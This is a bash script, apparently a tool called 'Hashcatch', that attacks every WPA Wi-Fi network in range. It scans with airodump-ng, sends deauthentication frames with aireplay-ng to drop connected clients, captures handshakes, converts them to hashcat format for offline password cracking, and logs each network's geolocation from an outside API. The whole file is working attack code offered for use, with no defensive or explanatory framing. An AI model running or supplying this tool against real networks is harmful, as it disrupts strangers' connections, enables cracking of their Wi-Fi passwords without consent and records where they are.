#!/bin/bash

trap ctrl_c INT

RED='\033[0;31m'
LBLUE='\033[1;34m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]
then
	echo -e "[-] Requires root permission. Exiting!"
	exit 0
elif [ ! -f config ] || [ ! -f db ] || [ ! -d handshakes ]
then
	echo -e "[-] Essential file(s) missing. Run setup.sh and try again!"
	exit 0
elif [ ! `grep -i "interface" config | awk -F'=' '{print $2}'` ]
then
	echo -e "[-] Interface not mentioned in config file. Run setup.sh and try again!"
	exit 0
fi

if [[ `cat /etc/os-release` == *debian* ]]
then
        if [[ `dpkg -s aircrack-ng hashcat-utils hcxtools jq 2>&1` == *"not installed"* ]]
	then
		echo "${YELLOW}[!] The following packages are missing. Install them and try again!${NC}"
		exit 0
		if [[ `dpkg -s aircrack-ng 2>&1` == *"not installed"* ]]
		then
			echo -e "\taircrack-ng"
			exit 0
		elif [[ `dpkg -s hashcat-utils 2>&1` == *"not installed"* ]]
		then
			echo -e "\thashcat-utils"
			exit 0
		elif [[ `dpkg -s hcxtools 2>&1` == *"not installed"* ]]
		then
			echo -e "\thcxtools"
			exit 0
		elif [[ `dpkg -s jq 2>&1` == *"not installed"* ]]
		then
			echo -e "\tjq"
			exit 0
		fi
	fi
elif [[ `cat /etc/os-release` == *arch* ]]
then
        if [[ `pacman -Qi aircrack-ng hashcat-utils hcxtools jq 2>&1` == *"not found"* ]]
	then
		echo "${YELLOW}[!] The following packages are missing. Install them and try again${NC}"
		if [[ `pacman -Qi aircrack-ng 2>&1` == *"not found"* ]]
		then
			echo -e "\taircrack-ng"
			exit 0
		elif [[ `pacman -Qi hashcat-utils 2>&1` == *"not found"* ]]
		then
			echo -e "\thashcat-utils"
			exit 0
		elif [[ `pacman -Qi hcxtools 2>&1` == *"not found"* ]]
		then
			echo -e "\thcxtools"
			exit 0
		elif [[ `pacman -Qi jq 2>&1` == *"not found"* ]]
		then
			echo -e "\tjq"
			exit 0
		fi
	fi
fi

ctrl_c(){
	echo -en "\033[2K"
	echo -en "\n\r${YELLOW}[*] Keyboard Interrupt${NC}"
	echo -e "\033[K"
	echo -e "\r${LBLUE}[*] Handshakes captured this session: $hs_count${NC}"
	rm -r /tmp/hc_* &> /dev/null
	tput cnorm
	kill $! &> /dev/null
	exit 0
}

spin(){
        echo -en "/"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "-"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "\\"
        sleep 0.1
        echo -en "\033[1D"
        echo -en "|"
        sleep 0.1
        echo -en "\033[1D"
}

tput civis

echo -e "${RED}"
echo " __   __  _______  _______  __   __  _______  _______  _______  _______  __   __ "; sleep 0.2
echo "|  | |  ||   _   ||       ||  | |  ||       ||   _   ||       ||       ||  | |  |"; sleep 0.2
echo "|  |_|  ||  |_|  ||  _____||  |_|  ||       ||  |_|  ||_     _||       ||  |_|  |"; sleep 0.2
echo "|       ||       || |_____ |       ||       ||       |  |   |  |       ||       |"; sleep 0.2
echo "|       ||       ||_____  ||       ||      _||       |  |   |  |      _||       |"; sleep 0.2
echo "|   _   ||   _   | _____| ||   _   ||     |_ |   _   |  |   |  |     |_ |   _   |"; sleep 0.2
echo "|__| |__||__| |__||_______||__| |__||_______||__| |__|  |___|  |_______||__| |__|"; sleep 0.2
echo -en "\n${NC}"

interface=`grep -i 'interface' config | awk -F'=' '{print $2}'`

rm -r /tmp/hc_* &> /dev/null

echo -en "\033[3B"

hs_count=0

while true
do
	ap_count=0

	echo -en "\033[3A"
	echo -en "\033[2K"
	echo -en "\rStatus: ${YELLOW}Scanning for wifi networks${NC}"
	echo -en "\033[2C"
	while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
	timeout --foreground 3 airodump-ng "$interface" -t wpa -w /tmp/hc_out --output-format csv &> /dev/null
	echo -en "${NC}"
	kill $! &> /dev/null
	echo -en "\033[1B"
	echo -en "\033[2K"
	echo -en "\033[2B"
	echo -en "\r"

	#echo "[*] Reading stations"
	while read -r line; do bssid=$(echo $line | awk -F ',' '{print $1}'); essid=$(echo $line | awk -F',' '{print $14}'); channel=$(echo $line | awk -F',' '{print $4}'); echo $bssid,$essid,$channel; done < /tmp/hc_out-01.csv | grep -iE "([0-9A-F]{2}[:-]){5}([0-9A-F]{2}), [-a-zA-Z0-9_ !]+, ([0-9]{1,2})" > /tmp/hc_stations.tmp

	#echo "[*] Clearing temp files"
	rm /tmp/hc_out*

	readarray stations < /tmp/hc_stations.tmp

	mkdir /tmp/hc_captures &> /dev/null
	mkdir /tmp/hc_handshakes &> /dev/null

	for station in "${stations[@]}"
	do
		bssid=`echo "$station" | awk -F',' '{print $1}' | sed -e 's/^[" "]*//'`
		essid=`echo "$station" | awk -F',' '{print $2}' | sed -e 's/^[" "]*//'`
		channel=`echo "$station" | awk -F',' '{print $3}' | sed -e 's/^[" "]*//'`
		if [[ "`grep -i 'ignore' config | awk -F'=' '{print $2}'`" == *"$essid"* ]] || [[ "`grep "$bssid" db`" ]]
		then
			continue
		fi
		((ap_count++))
		echo -en "\033[2A"
		echo -en "\033[2K"
		echo -en "\rAccess Point: ${YELLOW}$essid${NC}"
		echo -en "\033[2B"
		echo -en "\033[3A"
		echo -en "\033[2K"
		echo -en "\rStatus: ${YELLOW}Deauthenticating clients${NC}"
		echo -en "\033[3B"
		echo -en "\r"
		iwconfig "$interface" channel "$channel"
		aireplay-ng --deauth 5 -a "$bssid" "$interface" &> /dev/null &
		sleep 1
		echo -en "\033[3A"
		echo -en "\033[2K"
		echo -en "\rStatus: ${YELLOW}Listening for handshake${NC}"
		while [ true ]; do echo -en "${YELLOW}"; spin; echo -en "${NC}"; done &
		echo -en "\033[2C"
		timeout --foreground 10s airodump-ng -w /tmp/hc_captures/"$bssid" --output-format pcap --bssid "$bssid" --channel "$channel" "$interface" &> /dev/null
		echo -en "${NC}"
		kill $! &> /dev/null
		echo -en "\033[3B"
		echo -en "\r"
		cap2hccapx "/tmp/hc_captures/$bssid-01.cap" "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
		hashflag=`wlanhcxinfo -i "/tmp/hc_handshakes/$bssid.hccapx" 2>&1`
		if [[ $hashflag == *"0 records loaded"* ]]
		then
			rm "/tmp/hc_handshakes/$bssid.hccapx" &> /dev/null
		else
			cp "/tmp/hc_handshakes/$bssid.hccapx" "handshakes/$bssid.hccapx" &> /dev/null
			((hs_count++))
			loc_data="`curl -s "https://api.mylnikov.org/geolocation/wifi?v=1.2&bssid=$bssid"`"
			if [ "`echo $loc_data`" ]
			then
				loc_lat="`echo $loc_data | jq .data.lat`"
				loc_lon="`echo $loc_data | jq .data.lon`"
				loc_range="`echo $loc_data | jq .data.range`"
				loc_time="`echo $loc_data | jq .data.time`"
				echo "$bssid,$essid,$loc_lat,$loc_lon,$loc_range,$loc_time" >> db
			else
				echo "$bssid,$essid" >> db
			fi
		fi
	done

	if [[ $ap_count == 0 ]]
	then
		echo -en "\033[1A"
		echo -en "\033[2K"
		echo -en "\rLast scan: ${YELLOW}Pwned all nearby WiFi networks${NC}"
		echo -en "\033[1B"
		echo -en "\r"
	else
		echo -en "\033[1A"
		echo -en "\033[2K"
		echo -en "\rLast scan: ${YELLOW}`ls /tmp/hc_handshakes/ | wc -l` new handshakes captured${NC}"
		echo -en "\033[1B"
		echo -en "\r"
	fi
done
